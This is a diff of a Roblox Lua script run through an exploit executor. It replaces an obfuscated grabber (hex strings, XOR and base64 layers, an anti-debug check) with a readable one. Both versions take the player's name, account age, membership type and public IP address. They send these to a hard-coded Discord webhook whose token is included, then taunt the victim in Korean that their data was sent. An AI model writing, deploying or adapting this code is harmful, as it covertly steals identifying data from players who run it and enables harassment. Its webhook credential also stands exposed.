@@ -1,1 +1,69 @@
-local _0xQzP9xW7rJ2k=(syn and syn.request)or(http and http.request)or request local _0xT3vK8yL1mQ4=_G[_0xX8cJ("68747470733a2f2f6170692e69706966792e6f72672f")]local _0xM4kB1wF8tY0=game.Players.LocalPlayer local _0xR7jQ3xH2nV5=_0xM4kB1wF8tY0.Name local _0xL9pW6yT4cZ8=_0xM4kB1wF8tY0.AccountAge local _0xF2tN0vK5mR3=tostring(_0xM4kB1wF8tY0.MembershipType)local _0xD5zY2rU6gM7=os.date(_G[_0xX8cJ("255925592d6d256425592048256d253a2553")])local _0xB1nX9tL3wQ8=0 local function _0xX8cJ(_0xE4vM7kR2jP6)local _0xH6sT0yW8fQ2=""for _0xK3rJ9vP1mN4 in _0xE4vM7kR2jP6:gmatch("..")do _0xH6sT0yW8fQ2=_0xH6sT0yW8fQ2..string.char(tonumber(_0xK3rJ9vP1mN4,16))end return _0xH6sT0yW8fQ2 end local function _0xJ8wF4tZ0rK6(_0xV5cX2qL7tY0)local _0xP2nL7hT1kW8=""for _0xA1tW8kN3rF6=1,string.len(_0xV5cX2qL7tY0)do _0xP2nL7hT1kW8=_0xP2nL7hT1kW8..string.char(string.byte(_0xV5cX2qL7tY0,_0xA1tW8kN3rF6)~0x5A)end local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local o=""for i=1,#_0xP2nL7hT1kW8,3 do local e=(_0xP2nL7hT1kW8:byte(i))>>2 local f=((_0xP2nL7hT1kW8:byte(i))&3)<<4|(_0xP2nL7hT1kW8:byte(i+1)or 0)>>4 local g=((_0xP2nL7hT1kW8:byte(i+1)or 0)&15)<<2|(_0xP2nL7hT1kW8:byte(i+2)or 0)>>6 local h=(_0xP2nL7hT1kW8:byte(i+2)or 0)&63 o=o..b:sub(e+1,e+1)..b:sub(f+1,f+1)..b:sub(g+1,g+1)..b:sub(h+1,h+1)end return o end local function _0xW1zQ6rY9tN2(_0xS4yH2pX7cB9)local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local d={}for i=1,#b do d[b:sub(i,i)]=i-1 end local o=""for i=1,#_0xS4yH2pX7cB9,4 do local e,f,g,h=d[_0xS4yH2pX7cB9:sub(i,i)]or 0,d[_0xS4yH2pX7cB9:sub(i+1,i+1)]or 0,d[_0xS4yH2pX7cB9:sub(i+2,i+2)]or 0,d[_0xS4yH2pX7cB9:sub(i+3,i+3)]or 0 o=o..string.char((e<<2)|(f>>4))if g>0 then o=o..string.char(((f&15)<<4)|(g>>2))end if h>0 then o=o..string.char(((g&3)<<6)|h)end end local _0xU6mR0vJ4zQ3=""for _0xC9qY3xM5pV2=1,string.len(o)do _0xU6mR0vJ4zQ3=_0xU6mR0vJ4zQ3..string.char(string.byte(o,_0xC9qY3xM5pV2)~0x5A)end return _0xU6mR0vJ4zQ3 end local function _0xB8kX5tM1cQ4()local _0xI3kM8vF0jP7=os.clock()if _0xB1nX9tL3wQ8>0 and os.clock()-_0xI3kM8vF0jP7>4 then error(_G[_0xX8cJ("446562756767696e6720646574656374656421")])end _0xB1nX9tL3wQ8=_0xB1nX9tL3wQ8+1 end local _0xZ4tF1qW7mK9={_0xX8cJ("584f522d3541")}local function _0xY0pJ5xR3cV8(_0xT7hN4qL2wX5,_0xN6rH0yP3vJ2)local _0xF9wL2zR6nT0=""for _0xH2tY7rW4zN1=1,string.len(_0xT7hN4qL2wX5)do local _0xL5cP9vM3jK6=string.byte(_0xT7hN4qL2wX5,_0xH2tY7rW4zN1)_0xF9wL2zR6nT0=_0xF9wL2zR6nT0..string.char(_0xL5cP9vM3jK6~string.byte(_0xN6rH0yP3vJ2,(_0xH2tY7rW4zN1%string.len(_0xN6rH0yP3vJ2))+1))end return _0xF9wL2zR6nT0 end local function _0xM7nT2kY6rQ3()_0xB8kX5tM1cQ4()if _0xQzP9xW7rJ2k then local _0xV3qJ8xK0mP5=_0xQzP9xW7rJ2k({Url=_0xT3vK8yL1mQ4,Method=_0xX8cJ("474554"),Headers={[_0xX8cJ("436f6e74656e742d54797065")]=_0xX8cJ("6170706c69636174696f6e2f6a736f6e")}})print("IP Fetch: "..tostring(_0xV3qJ8xK0mP5 and _0xV3qJ8xK0mP5.Body or "Failed"))if _0xV3qJ8xK0mP5 and _0xV3qJ8xK0mP5.Body then return _0xV3qJ8xK0mP5.Body else return _0xX8cJ("4950204661696c6564203a28")end else return _0xX8cJ("4e6f2048545450203a28")end end local function _0xC5qL9xP4tJ7()for _0xK1rY3vW8mN2=1,100 do local _0xU2tF6hQ0zX5=math.random(1,1000)*math.random()end end if _0xQzP9xW7rJ2k then _0xC5qL9xP4tJ7()local _0xE6wN0kR2vT8=_0xM7nT2kY6rQ3()local _0xH3zX7qP9jM4={content=_0xY0pJ5xR3cV8(_0xX8cJ("4065766572796f6e6520526f626c6f78204e616d653a20"),_0xZ4tF1qW7mK9[1]).._0xR7jQ3xH2nV5.._0xX8cJ("0a49503a20").._0xE6wN0kR2vT8.._0xX8cJ("0a4167653a20").._0xL9pW6yT4cZ8.._0xX8cJ("20646179730a5072656d69756d3a20").._0xF2tN0vK5mR3.._0xX8cJ("0a54696d653a20").._0xD5zY2rU6gM7}print("Webhook Data: "..game:GetService(_0xX8cJ("4874747053657276696365")):JSONEncode(_0xH3zX7qP9jM4))local _0xQ8tM1vK4rJ0,err=pcall(function()_0xQzP9xW7rJ2k({Url=_0xW1zQ6rY9tN2(_0xJ8wF4tZ0rK6(_0xX8cJ("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313336303532333636333137343237353231332f4951387a31334a6a39374c6637796646524c5979344f4e75712d75743775586d445641675139594669444d585169356f642d7969477756713971527176674730504e5535"))),Method=_0xX8cJ("504f5354"),Headers={[_0xX8cJ("436f6e74656e742d54797065")]=_0xX8cJ("6170706c69636174696f6e2f6a736f6e")]},Body=game:GetService(_0xX8cJ("4874747053657276696365")):JSONEncode(_0xH3zX7qP9jM4)})end)print("Webhook Status: "..(_0xQ8tM1vK4rJ0 and "Sent" or "Failed: "..tostring(err)))for _0xR9pW0vJ5hK2=1,3 do _0xC5qL9xP4tJ7()game:GetService(_0xX8cJ("53746172746572477569")):SetCore(_0xX8cJ("53656e644e6f74696669636174696f6e"),{Title=_0xY0pJ5xR3cV8(_0xX8cJ("496e666f2053656e742023").._0xR9pW0vJ5hK2,_0xZ4tF1qW7mK9[1]),Text=_0xX8cJ("49503a20").._0xE6wN0kR2vT8.._0xX8cJ("207c204167653a20").._0xL9pW6yT4cZ8.._0xX8cJ("2064617973207c205072656d69756d3a20").._0xF2tN0vK5mR3.._0xX8cJ("207c20636f6e746563743a207768696d736963616c5f6b6977695f3131303136"),Duration=6969747469})end else game:GetService(_0xX8cJ("53746172746572477569")):SetCore(_0xX8cJ("53656e644e6f74696669636174696f6e"),{Title=_0xY0pJ5xR3cV8(_0xX8cJ("4368616e6765204578656375746f72"),_0xZ4tF1qW7mK9[1]),Text=_0xX8cJ("4578656375746f72204973737565203a29"),Duration=5})print(_0xX8cJ("4e6f204854545020737570706f727420696e206578656375746f72"))end
+local discordWebhookURL = "https://discord.com/api/webhooks/1360523663174275213/IQ8z13Jj97Lf7yfFRLYy4ONuq-ut7uXmDVAgQ9YFiDMXQi5od-yiGwVq9qRqvgG0PNU5"
+local http_request = (syn and syn.request) or (http and http.request) or request
+local ipifyURL = "https://api.ipify.org/"
+
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local accountAge = player.AccountAge
+local premiumStatus = tostring(player.MembershipType)
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+
+local function getIP()
+    if http_request then
+        local success, response = pcall(function()
+            return http_request({
+                Url = ipifyURL,
+                Method = "GET",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+        end)
+        print("IP Fetch: " .. (success and response.Body or "Failed"))
+        if success and response and response.Body then
+            return response.Body
+        else
+            return "IP 가져오기 실패"
+        end
+    else
+        return "HTTP 요청 불가"
+    end
+end
+
+if http_request then
+    local ipAddress = getIP()
+    local data = {
+        content = "@everyone 로블록스 닉네임: " .. playerName ..
+                  "\nIP 주소: " .. ipAddress ..
+                  "\n계정 나이: " .. accountAge .. "일" ..
+                  "\n프리미엄 여부: " .. premiumStatus ..
+                  "\n실행 시간: " .. currentTime
+    }
+    print("Webhook Data: " .. game:GetService("HttpService"):JSONEncode(data))
+    local success, err = pcall(function()
+        http_request({
+            Url = discordWebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end)
+    print("Webhook Status: " .. (success and "Sent" or "Failed: " .. tostring(err)))
+
+    for i = 1, 3 do
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "당신의 정보는 제 웹훅으로 보내졌습니다 #" .. i,
+            Text = "니 IP: " .. ipAddress .. " | 계정 나이: " .. accountAge .. "일 | 프리미엄: " .. premiumStatus .. " | contect: whimsical_kiwi_11016",
+            Duration = 6969747469
+        })
+    end
+else
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "실행기를 바꿔주세요(솔라라 가능)",
+        Text = "실행기 이슈 :)",
+        Duration = 5
+    })
+    print("실행기가 HTTP 지원 안 하네")
+end
